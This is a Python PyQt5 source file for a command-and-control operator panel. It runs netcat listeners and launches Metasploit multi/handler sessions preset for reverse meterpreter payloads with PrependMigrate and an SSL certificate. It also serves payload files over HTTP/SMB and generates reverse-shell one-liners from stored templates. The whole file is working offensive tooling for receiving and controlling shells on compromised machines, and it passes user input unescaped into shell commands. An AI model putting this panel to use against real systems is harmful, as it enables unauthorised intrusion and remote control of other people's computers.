import sys
import os
import signal
import subprocess
import datetime
from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QPushButton, 
    QLineEdit, QComboBox, QTextEdit, QGroupBox, QSplitter, 
    QTabWidget, QFormLayout, QMessageBox, QDialog, QTableWidget, 
    QTableWidgetItem, QHeaderView, QFrame, QFileDialog, QCheckBox
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtNetwork import QNetworkInterface, QAbstractSocket

# Import DB Manager
from utils import c2_db_manager

# ---------------------------------------------------------
# 1. PROCESS WORKER
# ---------------------------------------------------------
class ProcessWorker(QThread):
    output_received = pyqtSignal(str)
    error_received = pyqtSignal(str)
    finished = pyqtSignal()

    def __init__(self, command, working_dir):
        super().__init__()
        self.command = command
        self.working_dir = working_dir
        self.process = None
        self.is_running = True

    def run(self):
        try:
            self.process = subprocess.Popen(
                self.command, 
                shell=True, 
                cwd=self.working_dir,
                stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT,
                stdin=subprocess.PIPE,
                text=True,
                bufsize=1,
                preexec_fn=os.setsid 
            )
            for line in iter(self.process.stdout.readline, ''):
                if not self.is_running: break
                self.output_received.emit(line.strip())
            
            self.process.stdout.close()
            self.process.wait()
            self.finished.emit()
        except Exception as e:
            self.error_received.emit(str(e))

    def write_input(self, text):
        if self.process and self.process.stdin:
            try:
                self.process.stdin.write(text + "\n")
                self.process.stdin.flush()
            except Exception as e:
                self.error_received.emit(f"Input Error: {e}")

    def stop(self):
        self.is_running = False
        if self.process:
            try:
                os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
            except ProcessLookupError:
                pass 

# ---------------------------------------------------------
# 2. REUSABLE LISTENER WIDGET (NETCAT)
# ---------------------------------------------------------
class NetcatListenerWidget(QWidget):
    """A single instance of a Netcat listener terminal."""
    def __init__(self, working_directory, parent=None):
        super().__init__(parent)
        self.working_directory = working_directory
        self.worker = None
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(5, 5, 5, 5)
        
        # Header Controls
        header = QHBoxLayout()
        self.inp_port = QLineEdit("4444")
        self.inp_port.setFixedWidth(80)
        self.btn_toggle = QPushButton("Start NC Listener")
        self.btn_toggle.setStyleSheet("background-color: #28a745; color: white; font-weight: bold;")
        self.btn_toggle.clicked.connect(self.toggle_listener)
        
        header.addWidget(QLabel("Port:"))
        header.addWidget(self.inp_port)
        header.addWidget(self.btn_toggle)
        header.addStretch()
        layout.addLayout(header)
        
        # Terminal Output
        self.term_out = QTextEdit()
        self.term_out.setReadOnly(True)
        self.term_out.setStyleSheet("background-color: black; color: #00ff00; font-family: Consolas; font-size: 13px; border: 1px solid #444;")
        layout.addWidget(self.term_out)
        
        # Input
        self.term_in = QLineEdit()
        self.term_in.setPlaceholderText("Type command...")
        self.term_in.setStyleSheet("background-color: #222; color: #00ff00; font-family: Consolas; border: 1px solid #444;")
        self.term_in.returnPressed.connect(self.send_command)
        layout.addWidget(self.term_in)

    def toggle_listener(self):
        if self.worker and self.worker.isRunning():
            self.worker.stop()
            self.worker = None
            self.btn_toggle.setText("Start NC Listener")
            self.btn_toggle.setStyleSheet("background-color: #28a745; color: white; font-weight: bold;")
            self.term_out.append("\n[!] Listener Stopped.")
        else:
            port = self.inp_port.text()
            cmd = f"nc -lvnp {port}"
            self.term_out.clear()
            self.term_out.append(f"[*] Starting: {cmd}\n")
            
            self.worker = ProcessWorker(cmd, self.working_directory)
            self.worker.output_received.connect(self.term_out.append)
            self.worker.error_received.connect(self.term_out.append)
            self.worker.start()
            
            self.btn_toggle.setText("Stop NC Listener")
            self.btn_toggle.setStyleSheet("background-color: #dc3545; color: white; font-weight: bold;")

    def send_command(self):
        if self.worker and self.worker.isRunning():
            cmd = self.term_in.text()
            self.term_out.append(f"> {cmd}")
            self.worker.write_input(cmd)
            self.term_in.clear()

# ---------------------------------------------------------
# 3. NEW: MSFCONSOLE LISTENER WIDGET (UPDATED)
# ---------------------------------------------------------
class MsfListenerWidget(QWidget):
    """A widget to launch msfconsole listeners quickly."""
    def __init__(self, working_directory, parent=None):
        super().__init__(parent)
        self.working_directory = working_directory
        self.worker = None
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(5, 5, 5, 5)
        
        # Configuration Group
        config_group = QGroupBox("Metasploit Handler Options")
        config_group.setStyleSheet("QGroupBox { font-weight: bold; color: #d63384; border: 1px solid #4a4a5e; margin-top: 5px; }")
        
        # Using a Grid Layout for better organization of new fields
        from PyQt5.QtWidgets import QGridLayout
        config_layout = QGridLayout(config_group)
        config_layout.setSpacing(10)

        # 1. Payload Selection
        self.combo_payload = QComboBox()
        self.combo_payload.setEditable(True)
        common_payloads = [
            "windows/x64/meterpreter/reverse_https", # Default for your request
            "windows/x64/meterpreter/reverse_tcp",
            "linux/x64/meterpreter/reverse_tcp",
            "java/jsp_shell_reverse_tcp",
            "php/meterpreter/reverse_tcp",
            "python/meterpreter/reverse_tcp",
            "cmd/unix/reverse_netcat"
        ]
        self.combo_payload.addItems(common_payloads)
        
        # 2. LHOST / LPORT
        self.inp_lhost = QComboBox() 
        self.inp_lhost.setEditable(True)
        self.refresh_ips()
        
        self.inp_lport = QLineEdit("443") # Default to 443 for https
        
        # 3. Advanced Options (Migrate & Cert)
        self.chk_migrate = QCheckBox("PrependMigrate")
        self.chk_migrate.setChecked(True) # True by default as requested
        self.chk_migrate.setToolTip("Sets PrependMigrate=true to migrate immediately upon connection.")
        
        self.chk_ssl = QCheckBox("Use SSL Cert:")
        self.chk_ssl.setChecked(True)
        self.chk_ssl.toggled.connect(lambda c: self.inp_ssl_cert.setEnabled(c))
        
        # Default cert path relative to project
        default_cert = os.path.join("payloads", "justice.pem")
        self.inp_ssl_cert = QLineEdit(default_cert)
        self.btn_browse_cert = QPushButton("...")
        self.btn_browse_cert.setFixedWidth(30)
        self.btn_browse_cert.clicked.connect(self.browse_cert)

        # 4. Start Button
        self.btn_start = QPushButton("Launch MSF")
        self.btn_start.setStyleSheet("background-color: #6610f2; color: white; font-weight: bold; padding: 5px;")
        self.btn_start.clicked.connect(self.toggle_msf)

        # --- Layout Placement ---
        # Row 0: Payload & Connection
        config_layout.addWidget(QLabel("Payload:"), 0, 0)
        config_layout.addWidget(self.combo_payload, 0, 1, 1, 3) # Span 3 columns
        
        config_layout.addWidget(QLabel("LHOST:"), 1, 0)
        config_layout.addWidget(self.inp_lhost, 1, 1)
        config_layout.addWidget(QLabel("LPORT:"), 1, 2)
        config_layout.addWidget(self.inp_lport, 1, 3)
        
        # Row 2: Advanced Options
        config_layout.addWidget(self.chk_migrate, 2, 0, 1, 2)
        
        # Row 3: SSL Cert (Nested Layout for checkbox+input+btn)
        h_ssl = QHBoxLayout()
        h_ssl.setContentsMargins(0,0,0,0)
        h_ssl.addWidget(self.chk_ssl)
        h_ssl.addWidget(self.inp_ssl_cert)
        h_ssl.addWidget(self.btn_browse_cert)
        config_layout.addLayout(h_ssl, 3, 0, 1, 4)
        
        # Row 4: Button
        config_layout.addWidget(self.btn_start, 4, 0, 1, 4)

        layout.addWidget(config_group)

        # Terminal Output
        self.term_out = QTextEdit()
        self.term_out.setReadOnly(True)
        self.term_out.setStyleSheet("background-color: #1e1e1e; color: #d63384; font-family: Consolas; font-size: 13px; border: 1px solid #444;")
        layout.addWidget(self.term_out)

        # Input
        self.term_in = QLineEdit()
        self.term_in.setPlaceholderText("Type command into MSF session...")
        self.term_in.setStyleSheet("background-color: #222; color: #d63384; font-family: Consolas; border: 1px solid #444;")
        self.term_in.returnPressed.connect(self.send_command)
        layout.addWidget(self.term_in)

    def refresh_ips(self):
        self.inp_lhost.clear()
        interfaces = QNetworkInterface.allInterfaces()
        for iface in interfaces:
            if iface.flags() & QNetworkInterface.IsUp and not (iface.flags() & QNetworkInterface.IsLoopBack):
                for entry in iface.addressEntries():
                    if entry.ip().protocol() == QAbstractSocket.IPv4Protocol:
                        ip = entry.ip().toString()
                        self.inp_lhost.addItem(ip)
        self.inp_lhost.addItem("0.0.0.0")

    def browse_cert(self):
        start_dir = os.path.join(self.working_directory, "payloads")
        if not os.path.exists(start_dir): start_dir = self.working_directory
        
        f, _ = QFileDialog.getOpenFileName(self, "Select Handler Certificate", start_dir, "PEM Files (*.pem);;All Files (*)")
        if f:
            self.inp_ssl_cert.setText(f)

    def toggle_msf(self):
        if self.worker and self.worker.isRunning():
            self.worker.stop()
            self.worker = None
            self.btn_start.setText("Launch MSF")
            self.btn_start.setStyleSheet("background-color: #6610f2; color: white; font-weight: bold;")
            self.term_out.append("\n[!] MSF Stopped.")
        else:
            payload = self.combo_payload.currentText()
            lhost = self.inp_lhost.currentText()
            lport = self.inp_lport.text()
            
            # --- Construct MSF Command ---
            commands = [
                "use exploit/multi/handler",
                f"set PAYLOAD {payload}",
                f"set LHOST {lhost}",
                f"set LPORT {lport}",
                "set ExitOnSession false"
            ]
            
            # Add PrependMigrate if checked
            if self.chk_migrate.isChecked():
                commands.append("set PrependMigrate true")
            
            # Add HandlerSSLCert if checked
            if self.chk_ssl.isChecked():
                cert_path = self.inp_ssl_cert.text().strip()
                # Resolve relative path if needed
                if not os.path.isabs(cert_path):
                    cert_path = os.path.join(self.working_directory, cert_path)
                
                # Check if file exists (Optional: warn user, but for now just set it)
                if os.path.exists(cert_path):
                    commands.append(f"set HandlerSSLCert {cert_path}")
                    # For reverse_https, we often need StagerVerifySSLCert too if using paranoid mode
                    commands.append("set StagerVerifySSLCert true") 
                else:
                    self.term_out.append(f"[!] Warning: Cert file not found at {cert_path}. Listener might fail for paranoid payloads.")
            
            commands.append("run")
            
            # Join commands with semicolons
            msf_cmd_str = "; ".join(commands)
            
            # -q for quiet, -x to execute command
            full_cmd = f"msfconsole -q -x \"{msf_cmd_str}\""

            self.term_out.clear()
            self.term_out.append(f"[*] Starting: {full_cmd}\n")
            
            self.worker = ProcessWorker(full_cmd, self.working_directory)
            self.worker.output_received.connect(self.term_out.append)
            self.worker.error_received.connect(self.term_out.append)
            self.worker.start()
            
            self.btn_start.setText("Kill MSF")
            self.btn_start.setStyleSheet("background-color: #dc3545; color: white; font-weight: bold;")

    def send_command(self):
        if self.worker and self.worker.isRunning():
            cmd = self.term_in.text()
            self.term_out.append(f"> {cmd}")
            self.worker.write_input(cmd)
            self.term_in.clear()

# ---------------------------------------------------------
# 4. UPDATED FILE SERVER WIDGET (WITH FILE LISTING)
# ---------------------------------------------------------
class FileServerWidget(QWidget):
    """A single instance of a File Server (HTTP/SMB) with CWD Listing."""
    def __init__(self, working_directory, db_path, parent=None):
        super().__init__(parent)
        self.working_directory = working_directory
        self.db_path = db_path
        self.worker = None
        self.init_ui()
        self.load_options()
        self.refresh_file_list()

    def init_ui(self):
        layout = QHBoxLayout(self)
        layout.setContentsMargins(5, 5, 5, 5)
        
        # --- Left Panel: Config & Files ---
        left_panel = QFrame()
        left_layout = QVBoxLayout(left_panel)
        left_layout.setContentsMargins(0, 0, 10, 0)
        
        # 1. Config Section
        left_layout.addWidget(QLabel("1. Server Type:", styleSheet="color:#00d2ff; font-weight:bold;"))
        self.combo_type = QComboBox()
        self.combo_type.currentIndexChanged.connect(self.update_preview)
        left_layout.addWidget(self.combo_type)
        
        left_layout.addWidget(QLabel("2. Config (Port/Share):", styleSheet="color:#00d2ff; font-weight:bold;"))
        self.inp_arg = QLineEdit()
        self.inp_arg.textChanged.connect(self.update_preview)
        left_layout.addWidget(self.inp_arg)
        
        left_layout.addWidget(QLabel("3. Preview:", styleSheet="color:#00d2ff; font-weight:bold;"))
        self.txt_preview = QTextEdit()
        self.txt_preview.setFixedHeight(50)
        self.txt_preview.setStyleSheet("background-color: #222; color: #00ff00; font-family: Consolas;")
        left_layout.addWidget(self.txt_preview)
        
        self.btn_toggle = QPushButton("START SERVER")
        self.btn_toggle.setFixedHeight(40)
        self.btn_toggle.setStyleSheet("background-color: #28a745; color: white; font-weight: bold;")
        self.btn_toggle.clicked.connect(self.toggle_server)
        left_layout.addWidget(self.btn_toggle)

        # 2. File Listing Section (New)
        left_layout.addSpacing(15)
        file_header_layout = QHBoxLayout()
        file_header_layout.addWidget(QLabel("Local Files (CWD):", styleSheet="color:#ffc107; font-weight:bold;"))
        btn_refresh = QPushButton("↻")
        btn_refresh.setFixedWidth(30)
        btn_refresh.clicked.connect(self.refresh_file_list)
        file_header_layout.addWidget(btn_refresh)
        left_layout.addLayout(file_header_layout)

        # CWD Display
        self.lbl_cwd = QLineEdit(self.working_directory)
        self.lbl_cwd.setReadOnly(True)
        self.lbl_cwd.setStyleSheet("background-color: #333; color: #aaa; border: none; font-size: 10px;")
        left_layout.addWidget(self.lbl_cwd)

        # File Table
        self.table_files = QTableWidget()
        self.table_files.setColumnCount(2)
        self.table_files.setHorizontalHeaderLabels(["Name", "Size"])
        self.table_files.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        self.table_files.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeToContents)
        self.table_files.verticalHeader().setVisible(False)
        self.table_files.setStyleSheet("QTableWidget { background-color: #222; color: #eee; font-size: 11px; }")
        left_layout.addWidget(self.table_files)
        
        # --- Right Panel: Logs ---
        right_panel = QGroupBox("Server Log")
        right_panel.setStyleSheet("color: #ccc;")
        right_layout = QVBoxLayout(right_panel)
        self.txt_log = QTextEdit()
        self.txt_log.setReadOnly(True)
        self.txt_log.setStyleSheet("background-color: #101015; color: #aaa; font-family: Consolas; font-size: 12px;")
        right_layout.addWidget(self.txt_log)
        
        layout.addWidget(left_panel, stretch=1)
        layout.addWidget(right_panel, stretch=2)

    def load_options(self):
        self.combo_type.clear()
        servers = c2_db_manager.get_servers(self.db_path)
        for s in servers:
            self.combo_type.addItem(s['name'], s)
        self.update_preview()

    def update_preview(self):
        data = self.combo_type.currentData()
        if not data: return
        arg = self.inp_arg.text()
        tmpl = data['template']
        final = tmpl.replace("{ARG}", arg if arg else data['default_arg'])
        self.inp_arg.setPlaceholderText(data['default_arg'])
        self.txt_preview.setText(final)

    def handle_log(self, text):
        ignore = ["BrokenPipeError", "Traceback", "File \"/usr", "socketserver.py"]
        if any(x in text for x in ignore): return
        self.txt_log.append(text)

    def toggle_server(self):
        if self.worker and self.worker.isRunning():
            self.worker.stop()
            self.worker = None
            self.btn_toggle.setText("START SERVER")
            self.btn_toggle.setStyleSheet("background-color: #28a745; color: white; font-weight: bold;")
            self.txt_log.append("\n[!] Server Stopped.")
        else:
            cmd = self.txt_preview.toPlainText().strip()
            if not cmd: return
            self.txt_log.clear()
            self.txt_log.append(f"[*] Executing: {cmd}\n")
            self.worker = ProcessWorker(cmd, self.working_directory)
            self.worker.output_received.connect(self.handle_log)
            self.worker.error_received.connect(self.handle_log)
            self.worker.start()
            self.btn_toggle.setText("STOP SERVER")
            self.btn_toggle.setStyleSheet("background-color: #dc3545; color: white; font-weight: bold;")

    def refresh_file_list(self):
        """Lists files in the working directory."""
        self.table_files.setRowCount(0)
        try:
            files = os.listdir(self.working_directory)
            files.sort()
            for f in files:
                row = self.table_files.rowCount()
                self.table_files.insertRow(row)
                
                # Name
                item_name = QTableWidgetItem(f)
                self.table_files.setItem(row, 0, item_name)
                
                # Size
                try:
                    path = os.path.join(self.working_directory, f)
                    if os.path.isdir(path):
                        size_str = "<DIR>"
                    else:
                        size = os.path.getsize(path)
                        size_str = f"{size / 1024:.1f} KB"
                except:
                    size_str = "?"
                
                item_size = QTableWidgetItem(size_str)
                item_size.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
                self.table_files.setItem(row, 1, item_size)
        except Exception as e:
            print(f"Error listing files: {e}")

# ---------------------------------------------------------
# 5. MANAGER DIALOG (Existing)
# ---------------------------------------------------------
class C2ManagerDialog(QDialog):
    """Dialog to Add/Delete Payloads and Server Templates."""
    def __init__(self, db_path, parent=None):
        super().__init__(parent)
        self.db_path = db_path
        self.setWindowTitle("Manage C2 Database")
        self.resize(800, 600)
        self.setStyleSheet("""
            QDialog { background-color: #1e1e2f; color: white; }
            QTableWidget { background-color: #2f2f40; gridline-color: #4a4a5e; color: #e0e0e0; border: 1px solid #4a4a5e; }
            QHeaderView::section { background-color: #3e3e50; color: white; padding: 4px; }
            QLineEdit { background-color: #222; color: #00ff00; border: 1px solid #555; padding: 6px; }
            QPushButton { background-color: #3e3e50; color: white; padding: 8px; border: 1px solid #555; }
            QPushButton:hover { background-color: #4e4e60; border-color: #00d2ff; }
            QTabWidget::pane { border: 1px solid #4a4a5e; }
            QTabBar::tab { background: #2f2f40; color: #aaa; padding: 8px 20px; }
            QTabBar::tab:selected { background: #00d2ff; color: #1e1e2f; font-weight: bold; }
        """)
        
        layout = QVBoxLayout(self)
        self.tabs = QTabWidget()
        layout.addWidget(self.tabs)
        
        self.tab_payloads = QWidget()
        self.setup_payloads_tab()
        self.tabs.addTab(self.tab_payloads, "Reverse Shell Payloads")
        
        self.tab_servers = QWidget()
        self.setup_servers_tab()
        self.tabs.addTab(self.tab_servers, "Server Templates")
        
        btn_close = QPushButton("Close")
        btn_close.clicked.connect(self.accept)
        layout.addWidget(btn_close)

    def setup_payloads_tab(self):
        layout = QVBoxLayout(self.tab_payloads)
        
        form = QHBoxLayout()
        self.inp_p_name = QLineEdit(); self.inp_p_name.setPlaceholderText("Name (e.g. Python v2)")
        self.inp_p_tmpl = QLineEdit(); self.inp_p_tmpl.setPlaceholderText("Template (use {IP} and {PORT})")
        btn_add = QPushButton("Add"); btn_add.clicked.connect(self.add_payload)
        form.addWidget(self.inp_p_name, 1)
        form.addWidget(self.inp_p_tmpl, 3)
        form.addWidget(btn_add)
        layout.addLayout(form)
        
        self.table_p = QTableWidget()
        self.table_p.setColumnCount(3)
        self.table_p.setHorizontalHeaderLabels(["ID", "Name", "Template"])
        self.table_p.horizontalHeader().setSectionResizeMode(2, QHeaderView.Stretch)
        self.table_p.setSelectionBehavior(QTableWidget.SelectRows)
        layout.addWidget(self.table_p)
        
        btn_del = QPushButton("Delete Selected"); btn_del.clicked.connect(self.del_payload)
        layout.addWidget(btn_del)
        self.load_payloads()

    def setup_servers_tab(self):
        layout = QVBoxLayout(self.tab_servers)
        
        form = QHBoxLayout()
        self.inp_s_name = QLineEdit(); self.inp_s_name.setPlaceholderText("Name (e.g. Custom SMB)")
        self.inp_s_tmpl = QLineEdit(); self.inp_s_tmpl.setPlaceholderText("Template (use {ARG})")
        self.inp_s_arg = QLineEdit(); self.inp_s_arg.setPlaceholderText("Default Arg (e.g. 8000)")
        self.inp_s_arg.setFixedWidth(100)
        btn_add = QPushButton("Add"); btn_add.clicked.connect(self.add_server)
        form.addWidget(self.inp_s_name, 1)
        form.addWidget(self.inp_s_tmpl, 3)
        form.addWidget(self.inp_s_arg)
        form.addWidget(btn_add)
        layout.addLayout(form)
        
        self.table_s = QTableWidget()
        self.table_s.setColumnCount(4)
        self.table_s.setHorizontalHeaderLabels(["ID", "Name", "Template", "Def Arg"])
        self.table_s.horizontalHeader().setSectionResizeMode(2, QHeaderView.Stretch)
        self.table_s.setSelectionBehavior(QTableWidget.SelectRows)
        layout.addWidget(self.table_s)
        
        btn_del = QPushButton("Delete Selected"); btn_del.clicked.connect(self.del_server)
        layout.addWidget(btn_del)
        self.load_servers()

    def load_payloads(self):
        self.table_p.setRowCount(0)
        data = c2_db_manager.get_payloads(self.db_path)
        for i, row in enumerate(data):
            self.table_p.insertRow(i)
            self.table_p.setItem(i, 0, QTableWidgetItem(str(row['id'])))
            self.table_p.setItem(i, 1, QTableWidgetItem(row['name']))
            self.table_p.setItem(i, 2, QTableWidgetItem(row['template']))

    def load_servers(self):
        self.table_s.setRowCount(0)
        data = c2_db_manager.get_servers(self.db_path)
        for i, row in enumerate(data):
            self.table_s.insertRow(i)
            self.table_s.setItem(i, 0, QTableWidgetItem(str(row['id'])))
            self.table_s.setItem(i, 1, QTableWidgetItem(row['name']))
            self.table_s.setItem(i, 2, QTableWidgetItem(row['template']))
            self.table_s.setItem(i, 3, QTableWidgetItem(row['default_arg']))

    def add_payload(self):
        if c2_db_manager.add_payload(self.db_path, self.inp_p_name.text(), self.inp_p_tmpl.text()):
            self.inp_p_name.clear(); self.inp_p_tmpl.clear(); self.load_payloads()

    def del_payload(self):
        r = self.table_p.currentRow()
        if r >= 0:
            c2_db_manager.delete_payload(self.db_path, self.table_p.item(r, 0).text())
            self.load_payloads()

    def add_server(self):
        if c2_db_manager.add_server(self.db_path, self.inp_s_name.text(), self.inp_s_tmpl.text(), self.inp_s_arg.text()):
            self.inp_s_name.clear(); self.inp_s_tmpl.clear(); self.load_servers()

    def del_server(self):
        r = self.table_s.currentRow()
        if r >= 0:
            c2_db_manager.delete_server(self.db_path, self.table_s.item(r, 0).text())
            self.load_servers()

# ---------------------------------------------------------
# 6. C2 MAIN WIDGET
# ---------------------------------------------------------
class C2Widget(QWidget):
    def __init__(self, working_directory, parent=None):
        super().__init__(parent)
        self.working_directory = working_directory
        
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        resources_dir = os.path.join(base_dir, "resources")
        if not os.path.exists(resources_dir): os.makedirs(resources_dir)
        self.db_path = c2_db_manager.initialize_c2_db(resources_dir)
        
        self.listeners = [] # Track listener widgets
        self.servers = []   # Track server widgets
        self.msf_listeners = [] # Track MSF widgets
        
        self.init_ui()
        self.refresh_ips()
        self.load_payload_options()

    def init_ui(self):
        main_layout = QVBoxLayout(self)
        self.tabs = QTabWidget()
        
        # Stylesheet: Larger padding and min-width for comfortable text
        self.tabs.setStyleSheet("""
            QTabWidget::pane { border: 1px solid #4a4a5e; background-color: #1e1e2f; }
            QTabBar::tab { 
                background: #2f2f40; 
                color: #aaa; 
                padding: 12px 30px; 
                min-width: 120px;
                font-size: 14px;
                font-weight: bold;
            }
            QTabBar::tab:selected { 
                background: #00d2ff; 
                color: #1e1e2f; 
            }
        """)
        
        self.tab_servers = QWidget()
        self.setup_servers_tab()
        self.tabs.addTab(self.tab_servers, "File Servers")

        self.tab_shells = QWidget()
        self.setup_shells_tab()
        self.tabs.addTab(self.tab_shells, "Netcat")

        # NEW MSF TAB
        self.tab_msf = QWidget()
        self.setup_msf_tab()
        self.tabs.addTab(self.tab_msf, "Metasploit")
        
        
        main_layout.addWidget(self.tabs)

    # --- TAB 1: SHELLS & LISTENERS ---
    def setup_shells_tab(self):
        layout = QHBoxLayout(self.tab_shells)
        
        # LEFT: Generator (Payloads)
        gen_group = QGroupBox("Payload Generator")
        gen_group.setStyleSheet("QGroupBox { font-weight: bold; color: #00d2ff; border: 1px solid #4a4a5e; margin-top: 10px; }")
        gen_layout = QVBoxLayout(gen_group)
        
        form = QFormLayout()
        self.combo_ip = QComboBox() 
        self.inp_port = QLineEdit("4444")
        self.combo_type = QComboBox() 
        
        self.combo_type.currentIndexChanged.connect(self.generate_payload)
        self.combo_ip.currentIndexChanged.connect(self.generate_payload)
        self.inp_port.textChanged.connect(self.generate_payload)
        
        form.addRow("LHOST (IP):", self.combo_ip)
        form.addRow("LPORT:", self.inp_port)
        form.addRow("Payload Type:", self.combo_type)
        gen_layout.addLayout(form)
        
        self.txt_payload = QTextEdit()
        self.txt_payload.setFixedHeight(120)
        self.txt_payload.setReadOnly(True)
        self.txt_payload.setStyleSheet("background-color: #101015; color: #00ff00; font-family: Consolas;")
        gen_layout.addWidget(QLabel("Generated One-Liner:"))
        gen_layout.addWidget(self.txt_payload)
        
        btn_refresh = QPushButton("Refresh IPs / DB"); btn_refresh.clicked.connect(self.refresh_and_reload)
        btn_manage = QPushButton("Manage Payloads (DB)"); btn_manage.clicked.connect(self.open_manager)
        
        gen_layout.addWidget(btn_refresh)
        gen_layout.addWidget(btn_manage)
        gen_layout.addStretch()
        
        # RIGHT: Listener Tabs (4 by default)
        right_layout = QVBoxLayout()
        self.listener_tabs = QTabWidget()
        self.listener_tabs.setStyleSheet("""
            QTabBar::tab { padding: 8px 20px; font-size: 12px; min-width: 80px; }
        """)
        
        # Create 4 listeners
        for i in range(1, 5):
            listener = NetcatListenerWidget(self.working_directory)
            self.listener_tabs.addTab(listener, f"Listener {i}")
            self.listeners.append(listener)
            
        right_layout.addWidget(self.listener_tabs)
        
        splitter = QSplitter(Qt.Horizontal)
        splitter.addWidget(gen_group)
        
        right_widget = QWidget()
        right_widget.setLayout(right_layout)
        splitter.addWidget(right_widget)
        
        splitter.setSizes([350, 550])
        layout.addWidget(splitter)

    # --- TAB 2: MSF LISTENERS ---
    def setup_msf_tab(self):
        layout = QVBoxLayout(self.tab_msf)
        
        # We can have multiple MSF tabs if needed
        self.msf_tabs = QTabWidget()
        self.msf_tabs.setStyleSheet("QTabBar::tab { padding: 8px 20px; font-size: 12px; min-width: 120px; }")

        for i in range(1, 4):
            msf = MsfListenerWidget(self.working_directory)
            self.msf_tabs.addTab(msf, f"MSF Console {i}")
            self.msf_listeners.append(msf)

        layout.addWidget(self.msf_tabs)

    # --- TAB 3: SERVERS ---
    def setup_servers_tab(self):
        layout = QVBoxLayout(self.tab_servers)
        
        # Header
        h_ctrl = QHBoxLayout()
        h_ctrl.addWidget(QLabel("Manage File Servers:", styleSheet="font-size:14px; font-weight:bold; color:#00d2ff;"))
        btn_manage = QPushButton("Manage Server DB")
        btn_manage.clicked.connect(self.open_manager)
        h_ctrl.addStretch()
        h_ctrl.addWidget(btn_manage)
        layout.addLayout(h_ctrl)
        
        # Server Tabs
        self.server_tabs = QTabWidget()
        self.server_tabs.setStyleSheet("""
            QTabBar::tab { padding: 8px 20px; font-size: 12px; min-width: 100px; }
        """)
        
        # Init 2 Servers
        for i in range(1, 3):
            srv = FileServerWidget(self.working_directory, self.db_path)
            self.server_tabs.addTab(srv, f"Server {i}")
            self.servers.append(srv)
            
        layout.addWidget(self.server_tabs)

    # --- Logic ---
    def open_manager(self):
        dlg = C2ManagerDialog(self.db_path, self)
        dlg.exec_()
        self.load_payload_options()
        for s in self.servers: s.load_options()

    def refresh_and_reload(self):
        self.refresh_ips()
        self.load_payload_options()
        for m in self.msf_listeners:
            m.refresh_ips()

    def refresh_ips(self):
        self.combo_ip.clear()
        interfaces = QNetworkInterface.allInterfaces()
        for iface in interfaces:
            if iface.flags() & QNetworkInterface.IsUp and not (iface.flags() & QNetworkInterface.IsLoopBack):
                for entry in iface.addressEntries():
                    if entry.ip().protocol() == QAbstractSocket.IPv4Protocol:
                        ip = entry.ip().toString()
                        self.combo_ip.addItem(f"{iface.name()}: {ip}", ip)
        if self.combo_ip.count() == 0: self.combo_ip.addItem("127.0.0.1", "127.0.0.1")
        self.generate_payload()

    def load_payload_options(self):
        self.combo_type.clear()
        payloads = c2_db_manager.get_payloads(self.db_path)
        for p in payloads:
            self.combo_type.addItem(p['name'], p['template'])
        self.generate_payload()

    def generate_payload(self):
        ip = self.combo_ip.currentData()
        port = self.inp_port.text()
        tmpl = self.combo_type.currentData()
        if tmpl and ip and port:
            final = tmpl.replace("{IP}", ip).replace("{PORT}", port)
            self.txt_payload.setText(final)